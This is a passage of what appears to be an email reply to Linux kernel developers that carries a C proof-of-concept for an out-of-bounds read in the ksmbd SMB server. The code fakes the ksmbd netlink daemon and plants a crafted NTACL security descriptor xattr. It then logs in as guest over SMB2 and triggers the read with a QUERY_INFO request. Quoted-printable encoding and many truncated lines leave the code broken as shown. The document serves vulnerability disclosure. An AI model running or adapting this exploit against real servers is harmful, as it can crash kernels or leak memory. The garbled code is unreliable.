                       KSMBD_SHARE_FLAG_WRITEABLE | KSMBD_SHARE_FLAG_GUEST_=
OK |
                       KSMBD_SHARE_FLAG_GUEST_ONLY | KSMBD_SHARE_FLAG_OPLOC=
KS |
                       KSMBD_SHARE_FLAG_ACL_XATTR;
            r->create_mask =3D 0744; r->directory_mask =3D 0755;
            strncpy((char *)r->share_name, "test", 63);
            char *pp =3D rb + sizeof(struct ksmbd_share_config_response);
            strcpy(pp, SHARE_PATH);
            r->payload_sz =3D strlen(SHARE_PATH) + 1;
            r->veto_list_sz =3D 0;
            int total =3D sizeof(struct ksmbd_share_config_response) + r->p=
ayloa;
            nl_send(nl_sock, nl_family_id, KSMBD_EVENT_SHARE_CONFIG_RESPONS=
E, ;
            break;
        }
        case KSMBD_EVENT_TREE_CONNECT_REQUEST: {
            struct ksmbd_tree_connect_response r; memset(&r, 0, sizeof(r));
            if (payload) r.handle =3D *(uint32_t*)payload;
            r.status =3D KSMBD_TREE_CONN_STATUS_OK;
            r.connection_flags =3D KSMBD_TREE_CONN_FLAG_WRITABLE;
            nl_send(nl_sock, nl_family_id, KSMBD_EVENT_TREE_CONNECT_RESPONS=
E, ;
            break;
        }
        default: break;
        }
    }
    return NULL;
}

/* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D SMB2 client =3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D */
#pragma pack(push, 1)
struct smb2_header {
    uint8_t protocol_id[4]; uint16_t structure_size; uint16_t credit_charge=
;
    uint32_t status; uint16_t command; uint16_t credit_request;
    uint32_t flags; uint32_t next_command; uint64_t message_id;
    uint32_t reserved; uint32_t tree_id; uint64_t session_id;
    uint8_t signature[16];
};
#pragma pack(pop)

#define SMB2_NEGOTIATE     0x0000
#define SMB2_SESSION_SETUP 0x0001
#define SMB2_TREE_CONNECT  0x0003
#define SMB2_CREATE        0x0005
#define SMB2_QUERY_INFO    0x0010

static uint64_t msg_id =3D 0, session_id =3D 0;
static uint32_t tree_id_val =3D 0;
static uint8_t file_id[16];

static int smb_send(int s, void *b, int l) {
    uint8_t h[4] =3D {0, (l>>16)&0xFF, (l>>8)&0xFF, l&0xFF};
    if (send(s, h, 4, 0) !=3D 4) return -1;
    return send(s, b, l, 0) =3D=3D l ? 0 : -1;
}
static int smb_recv(int s, void *b, int bs) {
    uint8_t h[4];
    if (recv(s, h, 4, MSG_WAITALL) !=3D 4) return -1;
    int l =3D (h[1]<<16)|(h[2]<<8)|h[3]; if (l > bs) return -1;
    int t =3D 0;
    while (t < l) { int n =3D recv(s, (char*)b+t, l-t, 0); if (n<=3D0) retu=
rn -1; }
    return l;
}
static void mkhdr(struct smb2_header *h, uint16_t cmd) {
    memset(h, 0, 64);
    h->protocol_id[0]=3D0xFE; h->protocol_id[1]=3D'S'; h->protocol_id[2]=3D=
'M'; h->p;
    h->structure_size=3D64; h->command=3Dcmd; h->credit_request=3D31;
    h->message_id=3Dmsg_id++; h->session_id=3Dsession_id; h->tree_id=3Dtree=
_id_val;
}

static int negotiate(int s) {
    uint8_t buf[256]; memset(buf,0,sizeof(buf));
    mkhdr((void*)buf, SMB2_NEGOTIATE);
    uint8_t *b=3Dbuf+64;
    *(uint16_t*)(b)=3D36; *(uint16_t*)(b+2)=3D3; *(uint16_t*)(b+4)=3D1;
    *(uint32_t*)(b+12)=3D0xdeadbeef;
    *(uint16_t*)(b+36)=3D0x0202; *(uint16_t*)(b+38)=3D0x0210; *(uint16_t*)(=
b+40)=3D0;
    if (smb_send(s,buf,64+42)<0) return -1;
    uint8_t r[4096]; if (smb_recv(s,r,sizeof(r))<64) return -1;
    return ((struct smb2_header*)r)->status ? -1 : 0;
}

static int session_setup(int s) {
    uint8_t buf[512]; memset(buf,0,sizeof(buf));
    mkhdr((void*)buf, SMB2_SESSION_SETUP);
    uint8_t *b=3Dbuf+64; *(uint16_t*)b=3D25; *(uint8_t*)(b+3)=3D1;
    uint8_t nt[32]; memset(nt,0,32);
    memcpy(nt,"NTLMSSP",8); *(uint32_t*)(nt+8)=3D1; *(uint32_t*)(nt+12)=3D0=
x600082;
    uint16_t soff=3D64+24;
    *(uint16_t*)(b+12)=3Dsoff; *(uint16_t*)(b+14)=3D32;
    memcpy(buf+soff,nt,32);
    if (smb_send(s,buf,soff+32)<0) return -1;
    uint8_t r[4096]; int rl=3Dsmb_recv(s,r,sizeof(r)); if (rl<64) return -1=
;
    struct smb2_header *rh=3D(void*)r;
    session_id=3Drh->session_id;
    if (rh->status!=3D0xc0000016) return -1;
    /* Auth phase */
    memset(buf,0,sizeof(buf)); mkhdr((void*)buf,SMB2_SESSION_SETUP);
    ((struct smb2_header*)buf)->session_id=3Dsession_id;
    b=3Dbuf+64; *(uint16_t*)b=3D25; *(uint8_t*)(b+3)=3D1;
    uint8_t au[128]; memset(au,0,128);
    memcpy(au,"NTLMSSP",8); *(uint32_t*)(au+8)=3D3;
    int voff=3D72;
    uint8_t uname[]=3D{'g',0,'u',0,'e',0,'s',0,'t',0}; int uname_len=3D10;
    *(uint16_t*)(au+12)=3D0; *(uint16_t*)(au+14)=3D0; *(uint32_t*)(au+16)=
=3Dvoff;
    *(uint16_t*)(au+20)=3D0; *(uint16_t*)(au+22)=3D0; *(uint32_t*)(au+24)=
=3Dvoff;
    *(uint16_t*)(au+28)=3D0; *(uint16_t*)(au+30)=3D0; *(uint32_t*)(au+32)=
=3Dvoff;
    *(uint16_t*)(au+36)=3Duname_len; *(uint16_t*)(au+38)=3Duname_len; *(uin=
t32_t*);
    memcpy(au+voff,uname,uname_len);
    *(uint16_t*)(au+44)=3D0; *(uint16_t*)(au+46)=3D0; *(uint32_t*)(au+48)=
=3Dvoff+una;
    *(uint16_t*)(au+52)=3D0; *(uint16_t*)(au+54)=3D0; *(uint32_t*)(au+56)=
=3Dvoff+una;
    *(uint32_t*)(au+60)=3D0x60008215;
    int aulen=3Dvoff+uname_len;
    soff=3D64+24;
    *(uint16_t*)(b+12)=3Dsoff; *(uint16_t*)(b+14)=3Daulen;
    memcpy(buf+soff,au,aulen);
    if (smb_send(s,buf,soff+aulen)<0) return -1;
    rl=3Dsmb_recv(s,r,sizeof(r)); if (rl<64) return -1;
    rh=3D(void*)r;
    if (rh->status=3D=3D0) { session_id=3Drh->session_id; return 0; }
    return -1;
}

static int tree_connect(int s) {
    uint8_t buf[256]; memset(buf,0,sizeof(buf));
    mkhdr((void*)buf, SMB2_TREE_CONNECT);
    uint8_t *b=3Dbuf+64; *(uint16_t*)b=3D9;
    char pa[]=3D"\\\\127.0.0.1\\test";
    uint8_t pu[128]; int pl=3D0;
    for (int i=3D0; pa[i]; i++) { pu[pl++]=3Dpa[i]; pu[pl++]=3D0; }
    uint16_t po=3D64+8;
    *(uint16_t*)(b+4)=3Dpo; *(uint16_t*)(b+6)=3Dpl;
    memcpy(buf+po,pu,pl);
    if (smb_send(s,buf,po+pl)<0) return -1;
    uint8_t r[4096]; if (smb_recv(s,r,sizeof(r))<64) return -1;
    struct smb2_header *rh=3D(void*)r;
    if (rh->status) return -1;
    tree_id_val=3Drh->tree_id; return 0;
}

static int create_file(int s, const char *fn) {
    uint8_t buf[512]; memset(buf,0,sizeof(buf));
    mkhdr((void*)buf, SMB2_CREATE);
    uint8_t *b=3Dbuf+64; *(uint16_t*)b=3D57;
    *(uint32_t*)(b+24)=3D0x001F01FF; *(uint32_t*)(b+28)=3D0x80;
    *(uint32_t*)(b+32)=3D0x07; *(uint32_t*)(b+36)=3D0x05;
    uint8_t nu[256]; int nl=3D0;
    for (int i=3D0; fn[i]; i++) { nu[nl++]=3Dfn[i]; nu[nl++]=3D0; }
    uint16_t no=3D64+56;
    *(uint16_t*)(b+44)=3Dno; *(uint16_t*)(b+46)=3Dnl;
    memcpy(buf+no,nu,nl); int tl=3Dno+nl; if (tl<64+57) tl=3D64+57;
    if (smb_send(s,buf,tl)<0) return -1;
    uint8_t r[4096]; if (smb_recv(s,r,sizeof(r))<64) return -1;
    struct smb2_header *rh=3D(void*)r;
    if (rh->status) return -1;
    memcpy(file_id, r+64+64, 16); return 0;
}

static int query_info_sec(int s) {
    uint8_t buf[256]; memset(buf,0,sizeof(buf));
    mkhdr((void*)buf, SMB2_QUERY_INFO);
    uint8_t *b=3Dbuf+64;
    *(uint16_t*)b=3D41; *(uint8_t*)(b+2)=3D0x03;
    *(uint32_t*)(b+4)=3D65536;
    *(uint32_t*)(b+16)=3D0x07; /* OWNER|GROUP|DACL */
    memcpy(b+24, file_id, 16);
    if (smb_send(s,buf,64+41)<0) return -1;
    uint8_t r[8192]; if (smb_recv(s,r,sizeof(r))<64) return -1;
    return 0;
}

/* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D Main =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D */
int main(void) {

    mkdir(SHARE_PATH, 0777);
    const char *filepath =3D "/tmp/smbshare/testfile.txt";
    int fd =3D open(filepath, O_CREAT|O_WRONLY|O_TRUNC, 0755);
    if (fd >=3D 0) { write(fd, "test", 4); close(fd); }
    chmod(filepath, 0755);

    /* Set POSIX ACL: USER_OBJ(rwx), USER(7777,rwx), GROUP_OBJ(rx), MASK(rw=
x),/
    uint8_t posix_acl_xattr[4 + 5*8];
    memset(posix_acl_xattr, 0, sizeof(posix_acl_xattr));
    *(uint32_t*)(posix_acl_xattr) =3D 2;
    *(uint16_t*)(posix_acl_xattr+4)=3D0x01; *(uint16_t*)(posix_acl_xattr+6)=
=3D7; *;
    *(uint16_t*)(posix_acl_xattr+12)=3D0x02; *(uint16_t*)(posix_acl_xattr+1=
4)=3D7;;
    *(uint16_t*)(posix_acl_xattr+20)=3D0x04; *(uint16_t*)(posix_acl_xattr+2=
2)=3D5;;
    *(uint16_t*)(posix_acl_xattr+28)=3D0x10; *(uint16_t*)(posix_acl_xattr+3=
0)=3D7;;
    *(uint16_t*)(posix_acl_xattr+36)=3D0x20; *(uint16_t*)(posix_acl_xattr+3=
8)=3D5;;

    if (setxattr(filepath, "system.posix_acl_access", posix_acl_xattr, size=
of({
        perror("setxattr posix_acl"); return 1;
    }

    struct stat st; stat(filepath, &st);

    /* Compute NDR POSIX ACL hash */
    struct ndr_buf acl_ndr =3D {.data=3Dcalloc(1,1024), .offset=3D0, .capac=
ity=3D1024};
    struct acl_entry entries[5] =3D {
        {SMB_ACL_USER_OBJ, 0, 7}, {SMB_ACL_USER, 7777, 7},
        {SMB_ACL_GROUP_OBJ, 0, 5}, {SMB_ACL_MASK, 0, 7}, {SMB_ACL_OTHER, 0,=
 5},
    };
    ndr_encode_posix_acl_fn(&acl_ndr, st.st_uid, st.st_gid, st.st_mode, ent=
rie;

    uint8_t posix_hash[64]; memset(posix_hash, 0, 64);
    sha256(acl_ndr.data, acl_ndr.offset, posix_hash);

    /* Build crafted SD and adjust offsets */
    uint8_t sd_buf[2048];
    int sd_size =3D build_crafted_sd(sd_buf, sizeof(sd_buf));
    /* ksmbd_vfs_get_sd_xattr() subtracts NDR_NTSD_OFFSETOF back off on rea=
d */
    *(uint32_t*)(sd_buf+16) +=3D NDR_NTSD_OFFSETOF;

    uint8_t sd_hash[64]; memset(sd_hash, 0, 64);
    sha256(sd_buf, sd_size, sd_hash);

    /* Encode NDR v4 NTACL and write xattr */
    struct ndr_buf ntacl =3D {.data=3Dcalloc(1,4096), .offset=3D0, .capacit=
y=3D4096};
    ndr_encode_v4_ntacl_fn(&ntacl, sd_hash, posix_hash, sd_buf, sd_size);

    if (setxattr(filepath, "security.NTACL", ntacl.data, ntacl.offset, 0) <=
 0){
        perror("setxattr security.NTACL"); return 1;
    }
    free(acl_ndr.data); free(ntacl.data);

    /* Setup netlink IPC */
    nl_sock =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (nl_sock < 0) { perror("nlsock"); return 1; }
    struct sockaddr_nl sa =3D {.nl_family =3D AF_NETLINK, .nl_pid =3D getpi=
d()};
    if (bind(nl_sock, (void*)&sa, sizeof(sa)) < 0) { perror("bind"); return=
 1;}
    nl_family_id =3D resolve_genl_family(nl_sock, KSMBD_GENL_NAME);
    if ((int)nl_family_id <=3D 0) { fprintf(stderr, "No ksmbd genl\n"); ret=
urn 1}
    if (nl_mcast_grp > 0)
        setsockopt(nl_sock, SOL_NETLINK, NETLINK_ADD_MEMBERSHIP, &nl_mcast_=
grp;

    pthread_t ipc_tid;
    pthread_create(&ipc_tid, NULL, ipc_thread, NULL);

    /* Start ksmbd */
    struct ksmbd_startup_request req; memset(&req, 0, sizeof(req));
    strcpy((char*)req.min_prot,"SMB2_10"); strcpy((char*)req.max_prot,"SMB3=
_11;
    strcpy((char*)req.netbios_name,"TEST"); strcpy((char*)req.work_group,"W=
G");
    strcpy((char*)req.server_string,"t");
    req.tcp_port=3D445; req.ipc_timeout=3D60; req.file_max=3D10000;
    req.smb2_max_write=3D65536; req.smb2_max_read=3D65536; req.smb2_max_tra=
ns=3D6553;
    req.sub_auth[0]=3D1; req.sub_auth[1]=3D2; req.sub_auth[2]=3D3;
    req.smb2_max_credits=3D8192; req.max_connections=3D128;
    nl_send(nl_sock, nl_family_id, KSMBD_EVENT_STARTING_UP, KSMBD_EVENT_STA=
RTI;

    /* Connect to ksmbd */
    int ss =3D -1;
    for (int i =3D 0; i < 30; i++) {
        ss =3D socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in sv =3D {.sin_family=3DAF_INET, .sin_port=3Dhtons=
(445), .s;
        if (connect(ss, (void*)&sv, sizeof(sv)) =3D=3D 0) break;
        close(ss); ss =3D -1; usleep(500000);
    }
    if (ss < 0) { fprintf(stderr, "Cannot connect\n"); return 1; }

    if (negotiate(ss)) goto end;
    if (session_setup(ss)) goto end;
    if (tree_connect(ss)) goto end;
    if (create_file(ss, "testfile.txt")) goto end;

    /* One QUERY_INFO(SecInfo=3DDACL) is enough; the read is deterministic.=
 */
    printf("[*] Triggering OOB read...\n"); fflush(stdout);
    query_info_sec(ss);
    usleep(500000);

end:
    close(ss); daemon_running =3D 0; close(nl_sock); sleep(1);
    return 0;}
```


Best,
Xiang
> --
> ChenXiaoSong <chenxiaosong@chenxiaosong.com>
> Chinese Homepage: https://chenxiaosong.com
> English Homepage: https://chenxiaosong.com/en
>
